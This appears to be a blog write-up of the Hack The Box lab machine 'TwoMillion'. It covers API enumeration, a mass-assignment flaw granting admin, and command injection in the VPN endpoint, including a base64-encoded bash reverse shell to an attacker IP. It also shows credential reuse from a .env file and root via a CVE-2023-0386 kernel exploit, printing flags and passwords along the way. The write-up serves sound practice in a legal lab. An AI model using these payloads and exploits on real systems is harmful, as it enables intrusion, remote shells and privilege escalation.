---
title: Hack the Box - TwoMillion
time: 2025-11-17 12:00:00
categories: [htb, easy]
---

<!-- <link rel="shortcut icon" type="image/png" href="{{ "/assets/img/cat.jpg" }}"> -->

<img width="922" height="128" alt="image" src="https://github.com/user-attachments/assets/7229deb4-bd59-4e88-ba97-9938aae9f517" />

## Recon
### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```bash
╰─ nmap -p- -v --min-rate 1000 10.10.11.221             
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-19 22:06 +08
Initiating Ping Scan at 22:06
Scanning 10.10.11.221 [2 ports]
Completed Ping Scan at 22:06, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:06
Completed Parallel DNS resolution of 1 host. at 22:06, 0.01s elapsed
Initiating Connect Scan at 22:06
Scanning 10.10.11.221 (10.10.11.221) [65535 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
..............
[SNIP]
..............

╰─ nmap -p 22,80 -sCV 10.10.11.221             
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-19 22:09 +08
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```
The HTTP service redirects to 2million.htb, so add it to `/etc/hosts`.

#### 2million.htb - TCP 80 (nginx HTTP)
POST /api/v1/invite/how/to/generate HTTP/1.1
```
╰─ curl -X POST http://2million.htb/api/v1/invite/how/to/generate                                                     
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%   
```

```
╰─ curl -X POST http://2million.htb/api/v1/invite/generate                              
{"0":200,"success":1,"data":{"code":"Sjg5QlctNzlJNkItUjdSSlMtSjJESFA=","format":"encoded"}}%        
```

<img width="808" height="482" alt="image" src="https://github.com/user-attachments/assets/193b73b0-94cc-46ab-a2fa-f4c87fc51c1d" />

```
POST /api/v1/user/register HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://2million.htb
DNT: 1
Connection: close
Referer: http://2million.htb/register
Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua
Upgrade-Insecure-Requests: 1

code=J89BW-79I6B-R7RJS-J2DHP&username=test&email=test%40gmail.com&password=test123&password_confirmation=test123
```

http://2million.htb/home
<img width="1352" height="501" alt="image" src="https://github.com/user-attachments/assets/8e4cf6c6-ee27-4ee6-9cfb-4d92b76d5c26" />

http://2million.htb/api/v1/user/vpn/generate
<img width="1172" height="420" alt="image" src="https://github.com/user-attachments/assets/82429c13-6fd2-4374-ad96-59845b9c8e21" />
```
╰─ curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api
{"\/api\/v1":"Version 1 of the API"}%
```


```
curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}%
```
<img width="561" height="429" alt="image" src="https://github.com/user-attachments/assets/e98f3170-e247-4cb6-912b-108051f6a159" />

```
─ curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/auth
{"message":false}%                                                                                                                                               
╭─      ~ ································································································································ ✔  23:56:47   
╰─ curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" \
  -H "Content-Type: application/json" \
  --data '{"email":"arifpeycal@gmail.com","is_admin":1}'

{"id":16,"username":"arif2002","is_admin":1}%                                                                                                                    
╭─      ~ ······················································································································· ✔  16s    23:57:07   
╰─ curl -X GET -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/auth
{"message":true}%
```
```
 curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Invalid content type."}%                                                                                                           
╭─      ~ ································································································································ ✔  23:59:36   
╰─ curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Missing parameter: username"}%
```

```
─ curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --data '{"username":"arif2002"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
```

─ curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --data '{"username":"arif2002 && curl 10.10.14.108:8000"}'

<img width="713" height="108" alt="image" src="https://github.com/user-attachments/assets/7da8bd39-3ce6-48b8-b888-13c063071265" />

╰─ curl -X POST \
 -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" \
 -H "Content-Type: application/json" \
 http://2million.htb/api/v1/admin/vpn/generate \
 --data '{"username":"arif2002 && echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDgvNDQ0NCAwPiYx | base64 -d | bash"}'

<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>


<img width="882" height="297" alt="image" src="https://github.com/user-attachments/assets/600dbddc-a3f5-412d-9732-f63040717b60" />

```
<?php 

session_start();

//error_reporting(E_ALL);
//ini_set('display_errors',1);

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
    $line = trim($line);
    if (!empty($line) && strpos($line, '=') !== false) {
        list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        $envVariables[$key] = $value;
    }
}


$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];


$database = new Database($dbHost, $dbUser, $dbPass, $dbName);
$database->connect();

$router = new Router();

```


```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ 
```

```
─ ssh admin@10.10.11.221    
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password: 
Permission denied, please try again.
admin@10.10.11.221's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
admin@2million:~$ ls
linpeas.sh  snap  user.txt
admin@2million:~$ cat user.txt
1b878e8d5d87dfc1aa90eb83a1ab3190

```
```
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

```
admin@2million:~$ uname -r
5.15.70-051570-generic
```

admin@2million:/tmp$ cd CVE-2023-0386
admin@2million:/tmp/CVE-2023-0386$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601

admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 19 17:08 .
drwxrwxr-x 6 root   root     4096 Nov 19 17:04 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
e0fc183e4d08e67cb60a7b894910978e
root@2million:/tmp/CVE-2023-0386# 
